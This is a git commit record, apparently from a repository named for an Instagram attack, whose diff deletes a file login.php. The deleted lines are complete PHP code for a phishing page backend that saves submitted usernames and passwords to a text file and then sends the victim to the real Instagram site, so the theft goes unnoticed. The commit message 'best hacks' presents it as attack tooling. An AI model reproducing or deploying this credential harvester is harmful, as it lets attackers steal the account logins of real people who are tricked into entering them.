9e03e499c79c6deb628ab3595ea5d4fbb136c610
karanhackers <smartgamer7780@gmail.com>
2020-07-01 20:35:58 +0530

    best hacks

--- karan/Instagram_advanced_attack/login.php
+++
@@ -1,4 +0,0 @@
-<?php
-file_put_contents("usernames.txt", "[EMAIL]: " . $_POST['username'] . " [PASS]: " . $_POST['password'] . "\n", FILE_APPEND);
-header('Location: https://www.instagram.com');
-exit();
